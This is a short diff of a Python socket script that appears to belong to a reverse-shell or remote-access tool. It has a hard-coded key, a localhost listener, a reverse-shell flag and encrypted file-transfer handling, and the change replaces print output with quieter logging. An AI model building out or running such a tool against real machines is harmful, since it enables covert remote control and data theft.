@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+import logging
 import utils
 from socket import socket
 
@@ -6,6 +7,8 @@ key = b'\xe9\xcex8\x01\x98\xc5Z\xed\xd0F\xff\xff\xff\xff\xff'
 host = "127.0.0.1"
 port = 1005
 
+#logging.basicConfig(level=logging.DEBUG) # Show Console Output
+logging.basicConfig(level=logging.WARN) # Dont show Console Output
 reverse_shell_active = False
 
 sock = socket()
@@ -43,7 +46,7 @@ while True:
             recv = utils.decrypt(conn.recv(utils.BUFFSIZE))
             if recv:
                 header = recv.decode(utils.ENCODING).split("__")
-                print("header", header)
+                logging.debug(f"header {header}")
 
                 if len(header) == 2: # If len is 2, the header contains a filename. In this case its a file and will be handled as one
                     filename, chunk_size = header[0], int(header[1])
